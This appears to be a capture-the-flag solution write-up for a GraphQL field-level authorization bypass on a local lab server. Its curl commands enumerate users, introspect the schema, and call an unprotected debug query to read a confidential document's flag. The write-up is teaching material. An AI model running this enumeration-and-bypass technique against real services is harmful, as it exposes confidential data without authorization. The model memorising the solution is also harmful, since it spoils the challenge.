# Solution: Field-level Authorization Bypass

## Overview

This challenge demonstrates a field-level authorization bypass where a debug endpoint lacks proper access controls, allowing access to confidential documents that are filtered out by other queries.

## Step 1: Reconnaissance

Explore the available queries and data structure:

```bash
curl -X POST http://localhost:8004/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username email role } }"
  }'
```

This reveals three users including an `admin_user` with role `admin`.

Check the documents:

```bash
curl -X POST http://localhost:8004/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { documents(userId: 3) { id title confidential } }"
  }'
```

Notice that admin_user (ID 3) shows no documents, suggesting confidential documents are being filtered.

## Step 2: Vulnerability Identification

Use introspection to discover all available queries:

```bash
curl -X POST http://localhost:8004/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { queryType { fields { name } } } }"
  }'
```

This reveals a `debug` query that might have different access controls.

Also explore the Document type fields:

```bash
curl -X POST http://localhost:8004/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __type(name: \"Document\") { fields { name } } }"
  }'
```

This reveals additional fields like `internalRef`, `debugInfo`, and `owner`.

## Step 3: Exploitation

The `debug` query bypasses the confidentiality filtering applied to other queries. It requires both a `userId` and document `id`:

```bash
curl -X POST http://localhost:8004/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { debug(userId: 3, id: 2) { id title confidential debugInfo } }"
  }'
```

This query:
- Targets user ID 3 (admin_user)
- Requests document ID 2 (the confidential document)
- Returns the `debugInfo` field which contains the flag

## Step 4: Flag Retrieval

The flag is stored in the `debugInfo` field of the confidential document (ID 2) belonging to admin_user (ID 3). The `debug` query returns this document without the confidentiality filter that blocks access through normal queries.

The flag follows the format: `HC{...}`
